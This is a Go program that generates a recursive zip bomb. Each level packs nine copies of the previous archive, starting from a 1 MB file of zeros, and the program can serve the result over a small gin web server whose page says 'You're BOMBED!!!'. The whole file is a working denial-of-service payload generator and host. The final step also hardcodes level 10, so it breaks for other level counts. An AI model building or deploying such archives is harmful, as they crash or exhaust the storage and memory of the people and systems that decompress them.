package main

import (
	"archive/zip"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
)

func check(e error) {
	if e != nil {
		log.Fatal((e))
	}
}

func ZipFiles(filename string, file string) error {
	newZipFile, err := os.Create(filename)
	check(err)
	defer newZipFile.Close()

	zipWriter := zip.NewWriter(newZipFile)
	defer zipWriter.Close()

	err = AddFileToZip(zipWriter, file)
	os.Remove(file)
	return err
}

func AddFileToZip(zipWriter *zip.Writer, filename string) error {
	fileToZip, err := os.Open(filename)
	check(err)
	defer fileToZip.Close()

	info, err := fileToZip.Stat()
	check(err)

	header, err := zip.FileInfoHeader(info)
	check(err)

	header.Name = filename

	header.Method = zip.Deflate
	writer, err := zipWriter.CreateHeader(header)
	check(err)
	_, err = io.Copy(writer, fileToZip)
	return err
}

func CopyAndCompress(file string, count int) error {
	newZipName := fmt.Sprintf("bomb/level%d.zip", count+1)
	newZipFile, err := os.Create(newZipName)
	check(err)
	defer newZipFile.Close()
	zipWriter := zip.NewWriter(newZipFile)
	defer zipWriter.Close()
	bytesRead, err := ioutil.ReadFile(file)
	check(err)
	for i := 1; i < 10; i++ {
		zipName := fmt.Sprintf("bomb/%d.zip", i)
		err = ioutil.WriteFile(zipName, bytesRead, 0755)
		check(err)
		err = AddFileToZip(zipWriter, zipName)
		check(err)
		os.Remove(zipName)
	}
	os.Remove(file)
	return nil
}

func Generate(levels int) {
	// Import functions from another file
	// Remove dummy.txt
	// Implement flat compression
	start := time.Now()
	dummyFile := "bomb/dummy.txt"
	file, err := os.Create(dummyFile)
	check(err)
	defer file.Close()
	x := strings.Repeat("0", 1024*1024)
	_, err = file.Write([]byte(x))
	check(err)
	defer file.Close()
	level1 := "bomb/level1.zip"
	err = ZipFiles(level1, dummyFile)
	check(err)
	decompressionSize := 1
	for i := 1; i < levels; i++ {
		decompressionSize *= 10
		zipName := fmt.Sprintf("bomb/level%d.zip", i)
		err = CopyAndCompress(zipName, i)
		check(err)
	}
	bombLevel := fmt.Sprintf("bomb/level%d.zip", 10)
	bytesRead, err := ioutil.ReadFile(bombLevel)
	check(err)
	err = ioutil.WriteFile("bomb/bomb.zip", bytesRead, 0755)
	check(err)
	os.Remove(bombLevel)
	os.Remove(dummyFile)
	end := time.Now()
	elapsed := end.Sub(start)
	bombInfo, err := os.Stat("bomb/bomb.zip")
	check(err)
	bombSize := bombInfo.Size()
	fmt.Println("bomb file: bomb.zip", bombSize/1024, "KB")
	fmt.Println("Decompression size", decompressionSize, "MB")
	fmt.Println("Total time elapsed:", elapsed, "milliseconds")
}

func home(c *gin.Context) {
	c.String(http.StatusOK, "You're BOMBED!!!")
}

func main() {
	Isgenerate := os.Args[1]
	if Isgenerate == "generate" {
		levels, err := strconv.Atoi(os.Args[2])
		check(err)
		Generate(levels)
	} else if Isgenerate == "host" {
		router := gin.Default()
		router.GET("/", home)
		router.Static("/static", "./bomb")
		router.Run("localhost:8080")
	}
}
